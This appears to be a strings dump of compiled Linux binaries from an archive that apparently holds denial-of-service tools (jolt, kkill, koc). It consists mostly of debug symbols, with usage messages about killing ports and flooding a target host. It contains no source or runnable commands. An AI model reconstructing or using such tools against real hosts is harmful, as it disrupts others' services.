            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "jolt.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "_init",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "_start",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/kkill",
            "0100755",
            "0000000",
            "0000000",
            "00000033574",
            "07100656622",
            "013204",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "system",
            "socket",
            "select",
            "__deregister_frame_info",
            "inet_aton",
            "getsockopt",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "fcntl",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRhD",
            "U(1fE",
            "fEfE",
            "uJEPj",
            "UPEPH",
            ":su\tU",
            "WVS\u01c5",
            "L\u0209<8",
            "HPPj",
            "P u}E",
            "E4\u01c5@",
            "@P u",
            "\u01c5HPPj",
            "ou#h`",
            "qu!h",
            "[^_]",
            "\u0403;u[]",
            "clear",
            " KKill by kbyte@rwx.ml.org ",
            "usage: %s ip port ",
            " Killing %s on port %s ",
            "Failed calling connect() for sockfd[%d]!",
            "Port Closed. Try another one",
            "Bum! Port closed!!!",
            "Completed.",
            "Port Closed. Try another port",
            "Host unreachable. Try later",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "kkill.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "Connect",
            "select@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "system@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "getsockopt@@GLIBC_2.0",
            "inet_aton@@GLIBC_2.0",
            "_start",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "printf@@GLIBC_2.0",
            "count",
            "_fini",
            "fcntl@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "datapool/bin/koc",
            "0100755",
            "0000000",
            "0000000",
            "00000033300",
            "07100656623",
            "012636",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "connect",
            "memcpy",
            "perror",
            "puts",
            "socket",
            "send",
            "__deregister_frame_info",
            "herror",
            "strcmp",
            "gethostbyname",
            "htons",
            "__errno_location",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "close",
            "GLIBC_2.0",
            "1^PTRh4",
            "QVhL",
            ":-u$h",
            "u)EE",
            "u$EE",
            "EP]U:",
            "UPHP",
            "u/h\u040b",
            "EPLPHP:",
            ":Zt/h",
            "PEPEPEPh ",
            "EPLPHP",
            "PEPEPhH",
            "\u0403;u[]",
            "Usage: %s <host> -p port -t hits",
            "Must specify a target.",
            "error: socket()",
            "error: connect()",
            "Determining max MSGSIZE",
            "error: send()",
            "Max MSGSIZE is %d",
            "..%d bytes [%s:%d]..",
            "..%d bytes [%s:%d]..",
            "complete.",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "koc.c",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "strcmp@@GLIBC_2.0",
            "usage",
            "close@@GLIBC_2.0",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "__errno_location@@GLIBC_2.0",
            "puts@@GLIBC_2.0",
            "_init",
            "__deregister_frame_info@@GLIBC_2.0",
            "parse_args",
